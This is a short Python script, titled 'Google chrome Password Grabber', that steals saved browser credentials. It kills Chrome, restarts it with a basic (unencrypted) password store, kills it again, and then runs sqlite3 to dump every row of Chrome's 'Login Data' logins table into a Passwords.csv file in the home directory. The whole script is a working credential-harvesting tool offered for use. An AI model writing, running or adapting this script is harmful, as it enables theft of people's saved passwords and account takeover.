#!/usr/bin/python3

import os
import time
import multiprocessing


def get_config_path():
    home_dir = os.path.expanduser('~')
    check_path = home_dir + "/.config/google-chrome/Default"
    if os.path.isdir(check_path):
        print('Path exists!')
        return check_path


def kill_chrome_processes():
    print('Closing chrome browser!')
    os.system('pkill chrome')


def open_chrome_with_basic_password_store():
    print('Starting Chrome borser in basic store mode!')
    command = 'google-chrome --password-store=basic'
    os.system(command)


def export_passwords_to_csv():
    print('Exporting passwords to Passwords.csv in home dir!')
    command = 'sqlite3 -header -csv -separator "," ~/.config/google-chrome/Default/Login\ Data "SELECT * FROM logins" > ~/Passwords.csv'
    os.system(command)


if __name__ == '__main__':
    print('Google chrome Password Grabber')

    path = get_config_path()

    kill_chrome_processes()

    p = multiprocessing.Process(target=open_chrome_with_basic_password_store, name='Google-Chrome')
    p.start()
    time.sleep(10)
    p.terminate()
    # p.join()

    time.sleep(10)
    kill_chrome_processes()

    time.sleep(10)
    export_passwords_to_csv()
